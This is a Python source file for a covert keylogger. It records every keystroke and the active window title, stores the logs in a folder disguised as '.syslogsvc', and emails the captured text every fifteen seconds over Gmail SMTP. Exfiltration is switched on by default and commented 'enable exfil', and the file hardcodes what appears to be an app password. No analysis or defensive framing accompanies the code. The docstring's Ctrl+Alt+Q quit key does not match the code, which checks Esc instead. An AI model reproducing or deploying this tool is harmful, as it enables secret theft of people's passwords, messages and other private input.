
#!/usr/bin/env python3
r"""
keylog.py - keystroke + active-window logger
Logs to:  %LOCALAPPDATA%\.syslogsvc\   (Windows)
          ~/.syslogsvc/                (Linux / macOS)
Stop with Ctrl+C, or Ctrl+Alt+Q.
"""
import os, sys, time, threading, datetime, platform, subprocess
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    sys.exit("pip install pynput")

# ----------------------------------------------------------------- config
SEND_EMAIL   = True                 # set True to enable exfil
SMTP_HOST    = "smtp.gmail.com"
SMTP_PORT    = 587
SMTP_USER    = "YourMail@gmail.com"   #YourMail which is used for the send emails
SMTP_PASS    = "qezl faea rsze mafj"   # Gmail: generate an App Password
MAIL_TO      = "ReceiverMail@gmail.com"  #Mail  you want to receive the keylogger data 
FLUSH_EVERY  = 15                    # seconds between buffer flushes
POLL_WINDOW  = 0.75                  # seconds between window-title checks

BASE = Path(os.getenv("LOCALAPPDATA") or Path.home()) / ".syslogsvc"
BASE.mkdir(parents=True, exist_ok=True)

SPECIAL = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.backspace: "[BKSP]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
    keyboard.Key.home: "[HOME]",
    keyboard.Key.end: "[END]",
    keyboard.Key.page_up: "[PGUP]",
    keyboard.Key.page_down: "[PGDN]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.insert: "[INS]",
    keyboard.Key.print_screen: "[PRTSC]",
    keyboard.Key.ctrl_l: "[CTRL]", keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",  keyboard.Key.alt_r: "[ALT]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.cmd: "[WIN]", keyboard.Key.cmd_r: "[WIN]",
    keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]", keyboard.Key.f3: "[F3]",
    keyboard.Key.f4: "[F4]", keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]",
    keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]", keyboard.Key.f9: "[F9]",
    keyboard.Key.f10: "[F10]", keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
}

CTRL_MAP = {"\x03": "[CTRL-C]", "\x16": "[CTRL-V]", "\x18": "[CTRL-X]",
            "\x1a": "[CTRL-Z]", "\x01": "[CTRL-A]", "\x13": "[CTRL-S]",
            "\x06": "[CTRL-F]", "\x10": "[CTRL-P]", "\x0e": "[CTRL-N]",
            "\x15": "[CTRL-U]", "\x02": "[CTRL-B]", "\x0c": "[CTRL-L]"}


def active_window() -> str:
    """Best-effort foreground window title."""
    try:
        if platform.system() == "Windows":
            import ctypes
            u = ctypes.windll.user32
            h = u.GetForegroundWindow()
            n = u.GetWindowTextLengthW(h)
            buf = ctypes.create_unicode_buffer(n + 1)
            u.GetWindowTextW(h, buf, n + 1)
            return buf.value.strip()
        if platform.system() == "Linux":
            return subprocess.check_output(
                ["xdotool", "getactivewindow", "getwindowname"],
                stderr=subprocess.DEVNULL, timeout=1).decode(errors="ignore").strip()
        if platform.system() == "Darwin":
            return subprocess.check_output(
                ["osascript", "-e",
                 'tell app "System Events" to name of first process whose frontmost is true'],
                stderr=subprocess.DEVNULL, timeout=2).decode(errors="ignore").strip()
    except Exception:
        pass
    return ""


class Logger:
    def __init__(self):
        self.lock = threading.Lock()
        self.buf = []
        self.win = ""
        self.day = datetime.date.today()
        self.path = self._path(self.day)
        self.stop = threading.Event()

    def _path(self, day):
        return BASE / f"log_{day:%Y-%m-%d}.txt"

    def push(self, s: str):
        with self.lock:
            self.buf.append(s)

    def flush(self):
        with self.lock:
            if not self.buf:
                return
            chunk = "".join(self.buf)
            self.buf.clear()
            today = datetime.date.today()
            if today != self.day:                     # midnight rollover
                self.day, self.path = today, self._path(today)
            try:
                with open(self.path, "a", encoding="utf-8") as f:
                    f.write(chunk)
            except Exception:
                pass
        if SEND_EMAIL:
            self.mail(chunk)

    def mail(self, chunk: str):
        def _send():
            import smtplib
            from email.message import EmailMessage
            msg = EmailMessage()
            msg["Subject"] = f"keylog {platform.node()} {datetime.datetime.now():%H:%M}"
            msg["From"], msg["To"] = SMTP_USER, MAIL_TO
            msg.set_content(chunk)
            try:
                with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=20) as s:
                    s.starttls(); s.login(SMTP_USER, SMTP_PASS); s.send_message(msg)
            except Exception:
                pass
        threading.Thread(target=_send, daemon=True).start()

    def window_loop(self):
        while not self.stop.wait(POLL_WINDOW):
            w = active_window()
            if w and w != self.win:
                self.win = w
                self.push(f"\n\n===== [{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] "
                          f"{w} =====\n")

    def flush_loop(self):
        while not self.stop.wait(FLUSH_EVERY):
            self.flush()

    def on_press(self, key):
        try:
            ch = key.char
        except AttributeError:
            ch = None
        if ch is not None:
            if ch in CTRL_MAP:
                self.push(CTRL_MAP[ch])
            elif ord(ch) < 32:
                self.push(f"[\\x{ord(ch):02x}]")
            else:
                self.push(ch)
        else:
            tag = SPECIAL.get(key)
            if tag:
                self.push(tag)
            if key == keyboard.Key.esc:
                pass

    def on_release(self, key):
        if key == keyboard.Key.esc:
            # Ctrl+Alt+Q to quit
            if keyboard.Key.ctrl_l in hot or keyboard.Key.ctrl_r in hot:
                if keyboard.Key.alt_l in hot or keyboard.Key.alt_r in hot:
                    self.stop.set()
                    return False
        return True


hot = set()

def main():
    log = Logger()
    threading.Thread(target=log.window_loop, daemon=True).start()
    threading.Thread(target=log.flush_loop, daemon=True).start()

    def press(k):
        hot.add(k)
        log.on_press(k)

    def release(k):
        r = log.on_release(k)
        hot.discard(k)
        return r

    log.push(f"# session {datetime.datetime.now():%Y-%m-%d %H:%M:%S} "
             f"{platform.node()} {platform.system()}\n")
    try:
        with keyboard.Listener(on_press=press, on_release=release) as l:
            l.join()
    except KeyboardInterrupt:
        pass
    finally:
        log.stop.set()
        log.flush()


if __name__ == "__main__":
    main()
  
  



